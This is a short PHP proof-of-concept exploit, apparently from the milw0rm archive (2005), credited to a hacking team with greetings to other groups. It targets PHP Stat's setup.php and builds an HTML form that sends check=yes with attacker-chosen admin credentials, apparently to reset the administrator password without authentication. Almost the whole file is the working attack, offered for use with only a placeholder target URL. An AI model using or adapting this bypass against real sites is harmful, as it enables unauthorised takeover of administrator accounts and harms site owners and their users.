<?php
error_reporting(E_PARSE);
/*
================================================================
PHP Stat Administrative User Authentication Bypass POC Exploit
================================================================
====Trap-Set Underground Hacking Team===========mh_p0rtal============

Greetz to : Alpha_programmer , Oil_karchack , Str0ke   And Iranian Hacking & Security Teams :
Alphast , IHS Team , Shabgard Security Team , Emperor Hacking TEam
, CrouZ Security Team , Simorgh-ev Security Team ,

====================^^^^^^^^^^^^^^^^^^^-=========================
*/
# Config ________________________________
# address - example: http://www.site.com/setup.php Or www.site.com /dir/setup.php

$url = "http://www.site.com/setup.php";

# EnD ___________________________________

print "<form action=\"$url?check=yes&username=$username&password=$password\" >";
print "<input type=\"hidden\" name=\"check\"  value=\"yes\">";
print "Username : <input type=\"text\" name=\"username\"  value=\"admin\" size=\"25\"><br>";
print "Password : <input type=\"text\" name=\"password\"  value=\"abc123\" size=\"25\"><br>";
print ("<input type=submit value=::Change. > \n");
print "</form>";

//------------------------------------------------------End.
?>

# milw0rm.com [2005-05-30]